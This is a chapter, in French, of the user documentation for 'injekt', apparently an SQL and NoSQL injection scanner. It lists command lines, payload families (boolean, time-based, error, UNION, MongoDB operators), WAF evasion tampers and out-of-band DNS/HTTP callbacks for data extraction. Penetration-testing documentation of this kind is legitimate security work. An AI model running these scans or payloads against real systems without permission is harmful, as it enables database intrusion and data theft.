# 03 — Scan & détection

Moteur : `parse → baseline → detection → fingerprint → extraction(opt-in)`,
concurrence bornée `buffer_unordered(threads)`, `tokio::time::timeout` partout,
`CancellationToken` (Ctrl+C propre), barres `indicatif`, logs `tracing`.

## 3.1 Scan minimal viable

```bash
# Détection par défaut (all techniques, 5 threads) :
injekt --target "https://example.com/search?q=1" --threads 5
injekt auto --target "https://example.com/?id=1"   # pipeline recommandé
injekt scan --target "https://example.com/?id=1"   # alias historique déprécié (masqué de -h)
injekt -u "https://shop.example.com/product?id=42" -v   # debug ciblé

# Toujours valider le plan avant sur cible sensible :
injekt --target "https://example.com/?id=1" --profile stealth --dry-run
```

## 3.2 Baseline & WAF (lire avant d'attaquer)

1. **Baseline** : 3-5 requêtes saines → SHA-256 + moyenne/σ des réponses.
2. **Fingerprint WAF/CDN** : statuts + headers + corps de challenge.
3. **Diff** : Levenshtein + Jaccard → `DiffResult{similarity,time_delta,confidence}`.
4. **Confirmation** : paires TRUE/FALSE inversées, min 3 essais.

Comportement WAF :
- **Blocage actif** (403/406 répétés ou challenge) → `Baseline::is_waf_blocked()` + tampers auto `space2comment,randomcase` + baisse de confiance.
- **Simple présence CDN** → informative, pas de tamper auto.

```bash
# Ne pas forcer si WAF actif : baisser la voilure, observer en -v :
injekt --target "https://waf.example.com/?id=1" --profile stealth -v
# Filtrer les faux positifs infra (429/503 = négatifs, jamais de finding) :
injekt --target "https://example.com/?id=1" --ignore-code 429,503
# Baseline/WAF tourne AVANT ce filtre et n'est jamais ignorée.
```

## 3.3 Les 8 techniques (quoi, quand, comment)

```bash
# Rapide / discret (2 techniques, faible bruit) :
injekt --target "https://example.com/?id=1" --techniques boolean,error

# Aveugle temporel (forcer DBMS si connu) :
injekt --target "https://example.com/?id=1" --techniques time --dbms postgres

# Verbose errors :
injekt --target "https://example.com/?id=1" --techniques error

# Union (extraction) :
injekt --target "https://example.com/?id=1" --techniques union --extract

# Tout (défaut) :
injekt --target "https://example.com/?id=1" --techniques all
```

| Technique | Signal exploité | Payloads (extraits `src/techniques/`) | Quand l'isoler |
|---|---|---|---|
| `boolean` | Diff TRUE (`OR 1=1`) vs FALSE (`AND 1=2`), commentaire par DBMS | `OR 1=1` / `AND 1=1` | Tri rapide, WAF inconnu, OPSEC |
| `time` | Délai `> baseline+2σ` | `SLEEP/pg_sleep/WAITFOR/BENCHMARK` + variantes heavy-query (`BENCHMARK` itérations seedées, `generate_series` Postgres sans mot-clé `pg_sleep`, cartésiens `sysobjects`/`all_objects` MSSQL, `RANDOMBLOB` SQLite — pas de `SLEEP()` sur SQLite) | Blind total, pages stables |
| `error` | Erreur SQL reflétée (masquée des faux positifs) + wrappers framework (Django `db.utils.*`, Laravel `QueryException`, Rails `ActiveRecord`) | `EXTRACTVALUE/CONVERT/CAST` + `json_extract`/`abs()` SQLite | Messages d'erreur verbeux ou pages debug framework |
| `union` | Diff + énumération `ORDER BY` (colonnes) | `UNION SELECT` / `ORDER BY n` | Finding boolean confirmé → dumper |
| `stacked` | Marqueur `; SELECT` (garde SELECT-only) | `; SELECT …` | Stacked queries suspectées (rare) |
| `oob` | Callback DNS/HTTP collaborateur | DNS/HTTP par DBMS | Blind sans diff ni erreur (OPT-IN, voir 3.7) |
| `json` | Dual boolean+error sur fonctions JSON + enveloppe GraphQL (variables, passthrough `{"errors":[{"message":…}]}` mysql/postgres) | `JSON_EXTRACT/->>/JSON_VALUE/OPENJSON/JSON_EXISTS` | Endpoints API/configs/blobs JSON, GraphQL adossé à SQL |
| `nosql` | Dual boolean+error sur opérateurs MongoDB | `{"$gt":""}/$ne/$regex` + `$where` invalide | Logins REST / bodies JSON adossés à MongoDB |

> `sqlite` est un label DBMS natif au même titre que mysql/postgres/mssql/oracle :
> fingerprint `sqlite_version()`, payloads time/error dédiés, marqueurs
> `sqlite3./sqlite_master/SQLITE_ERROR`.

```bash
# Forcer l'oracle d'extraction (réduit le set de techniques) :
injekt --target "https://example.com/?id=1" --fetch-using boolean
injekt --target "https://example.com/?id=1" --fetch-using time
injekt --target "https://example.com/?id=1" --fetch-using direct
```

## 3.4 `--level` 1-5 (budget de payloads)

```bash
injekt --target "https://example.com/?id=1" --level 1   # défaut : budget historique
injekt --target "https://example.com/?id=1" --level 2   # double le budget
injekt --target "https://example.com/?id=1" --level 3   # tout + ORDER BY élargi (+ equaltolike/numericobfuscate/linecomment auto)
injekt --target "https://example.com/?id=1" --profile aggressive  # = level 3 par défaut
```

Stratégie : **toujours L1 d'abord**. L2 si page instable/bruit. L3+ uniquement sur
cible confirmée intéressante + fenêtre autorisée (coût requêtes ×N).

## 3.5 Budgets : `--max-duration`, `--request-budget` (OPT-IN)

```bash
# Plafond de temps sur la détection seule (horloge démarrée après baseline/contexte) :
injekt --target "https://example.com/?id=1" --max-duration 120
# Plafond global de requêtes (coopératif : la technique en cours finit, aucune nouvelle ne démarre) :
injekt --target "https://example.com/?id=1" --request-budget 500
```

- `--max-duration N` (`0..=86400`, `INJEKT_MAX_DURATION`) : portée = **phase détection
  seule** — l'horloge démarre dans `run_detection`, APRÈS baseline + contexte
  (baseline/contexte/fingerprint/énumération NON couverts ; ne borne jamais le run total).
  `None` (défaut) = illimité, comportement historique byte-identique. **OPT-IN jamais
  via profil/config** : ni `--profile` ni `injekt.toml` ne le posent. Dépassé → break
  coopératif (warn + `Done` propre, aucun finding inventé). `0` = déclenchement immédiat.
  Au-delà de 86400s (24h) = rejet au parsing.
- `--request-budget N` (`0..=1000000`, `INJEKT_REQUEST_BUDGET`) : budget **global
  coopératif** — arrêt quand `SessionState::request_count` l'atteint : la technique en
  cours finit, aucune nouvelle ne démarre (warn + `Done` propre, jamais d'erreur ni de
  finding). `None` (défaut) = illimité : **ne jamais caper par défaut** (l'évasion A1
  demande ~1032 req en conditions réelles). Params concurrents : dépassement possible
  d'une technique par paramètre. `0` = arrêt immédiat. Au-delà de 1000000 = rejet au parsing.

## 3.6 Matchers : réduire les faux positifs/négatifs

```bash
# La réponse DOIT contenir (sinon veto) :
injekt --target "https://example.com/?id=1" --string "Welcome"
# La réponse NE DOIT PAS contenir (sinon veto) :
injekt --target "https://example.com/?id=1" --not-string "out of stock"
# Statut imposé (sinon veto) :
injekt --target "https://example.com/?id=1" --code 200
# Strip HTML avant comparaison (pages riches/JS) :
injekt --target "https://example.com/?id=1" --text-only
# Combiné (page produit instable) :
injekt --target "https://example.com/?id=1" --text-only --not-string "captcha" --ignore-code 429,503
```

Cas d'usage :
- Page avec CSRF/publicité rotative → `--text-only`.
- Message métier stable ("Bienvenue X" / "0 résultats") → `--string/--not-string`.
- API JSON → `--code` + `--dbms` + `--techniques json`.

`--confirm` : seconde passe stricte C6 (réelle) — re-sonde chaque finding **confirmé**
avec payloads frais + seed dérivé (`derive_confirm_seed(base, idx)`), OOB exclu, ~2×
requêtes pire cas. Ne crée **jamais** de finding : seuls les re-validés survivent
(échec franc = drop car probable FP ; cas douteux — transport, `--ignore-code`,
cancel = finding conservé). La confirmation in-detection (3 essais) reste active
avec ou sans le flag. La mini-mutation C5-tardive tourne dans cette passe (confirmés
seuls, ≤4 variantes / ≤8 requêtes par finding, tracée `mutation:<famille>`, échec
silencieux) — `--no-mutation` la coupe (voir chap. 4).

```bash
# Verdict 1-ligne, 0 requête (trace RAM + evidence, ex. `TRUE≈baseline 0.91, FALSE≠baseline 0.22, 3/3, …`) :
injekt --target "https://example.com/?id=1" --explain "id@query"
# Reproductibilité (tampers, jitter, UA, backoff seedés ; crypto d'export toujours OS-random) :
injekt --target "https://example.com/?id=1" --seed 42
# Forcer l'oracle d'extraction via --fetch-using (déjà §3.3) réduit le set de techniques.
```

## 3.7 OOB — out-of-band (OPT-IN, infra opérateur)

L'egress part du **serveur DB cible**, pas via `--proxy`. Collaborateur **auto-hébergé**
recommandé (interactsh/oastify self-hosted), jamais de domaine tiers non contrôlé.

```bash
injekt --target "https://example.com/?id=1" \
  --oob-domain x.oastify.com \
  --oob-poll-url "https://x.oastify.com/poll/{token}" \
  --techniques oob \
  --oob-wait-secs 10
```

- Sans `--oob-poll-url` contenant `{token}` : sondes **envoyées mais jamais auto-confirmées**
  (vérif manuelle UI collaborateur, **aucun finding sans preuve**).
- `--oob-wait-secs` (défaut 5) : attente de la requête DB asynchrone avant polling.

## 3.8 Réseau du scan (rappels, détails chap. 6)

```bash
injekt --target "https://example.com/?id=1" \
  --threads 5 --timeout 30 --retries 3 --delay 500 \
  --rate-limit 10 --jitter "750,250"
# jitter en MILLISECONDES, actif même sans flag (750±250, plancher 200).
# rate-limit toujours appliqué (pas de mode illimité).
```

## 3.9 Lecture d'un résultat

- Console : findings (`paramètre × technique × DBMS × confiance`) + `request_count`.
- `--output report.json` : seule source de vérité (voir chap. 8).
- `0 finding` + `request_count` élevé + WAF détecté → passer au chap. 4 (évasion),
  pas à l'extraction.
- `1 finding boolean L1` → chap. 5 (fingerprint forcé + union/extract), pas L5 immédiat.
